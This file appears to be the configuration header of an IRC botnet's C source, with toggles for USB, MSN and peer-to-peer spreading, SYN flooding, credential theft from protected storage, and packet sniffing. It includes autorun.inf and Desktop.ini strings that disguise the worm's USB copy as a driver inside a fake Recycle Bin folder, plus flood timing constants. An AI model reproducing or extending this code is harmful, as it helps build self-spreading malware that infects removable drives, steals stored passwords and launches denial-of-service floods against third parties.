/*
 ___    _____  __________          __  
|   |  /     \ \______   \  ____ _/  __
|   | /  \ /  \ |    |  _/ /  _ \\   __\
|   |/    Y    \|    |   \(  <_> )|  |
|___|\____|__  /|______  / \____/ |__|
             \/        \/
*/
//#define NO_UPDATE
//#define NO_USB
//#define NO_MSN
//#define NO_SEED
//#define NO_SUPERSYN
//#define NO_P2P
//#define NO_PSTORE

#define PING_TIMEOUT	200
#define IRCLINE			514
#define MAX_TOKENS		64
#define MAX_LOGINS		2
#define MAX_THREADS		512
#define MAX_IP			16
#define MAX_HOSTNAME	256
#define MAX_NICKLEN		22
#define REQ_NICKLEN		7
#define REQ_IDENTLEN	6
#define REQ_REALNLEN	22
#define MAX_KEY_LENGTH	255
#define MAX_VALUE_NAME	16383
#define NICK_TYPE		N_MINE
#define IDENT_TYPE		N_RNDLTR
#define REALN_TYPE		N_BOX
#define FLOOD_DELAY		2000
#define SFLOOD_DELAY	7000
#define RUPTIME_DELAY	600000
#define SECURE_DELAY	600000
#define AMPM(x) ((x>12)?("PM"):("AM"))
#define HOUR(x) ((x>12)?(x-12):(x))
#define fFD_ISSET(fd, set) __fWSAFDIsSet((SOCKET)(fd), (fd_set FAR *)(set))

#ifndef SIO_RCVALL
#define SIO_RCVALL _WSAIOW(IOC_VENDOR,1)
#endif

#define USBSLEEPTIME	12000
#define USB_STR_RECYCLER		"\\driver"
#define USB_STR_REC_SUBDIR		"\\usb"
#define USB_STR_DESKTOP_DATA	"[.ShellClassInfo]\r\nCLSID={645FF040-5081-101B-9F08-00AA002F954E}"
#define USB_STR_DESKTOP_INI		"\\Desktop.ini"
#define USB_STR_AUTORUN_INF		"\\autorun.inf"
#define USB_STR_AUTORUN_DATA1	"[autorun]\r\nopen="
#define USB_STR_AUTORUN_DATA2	"\r\naction=Open\r\nshell\\open=Open\r\nshell\\open\\command="
#define USB_STR_AUTORUN_DATA3	"\r\nUsb_Driver installed"
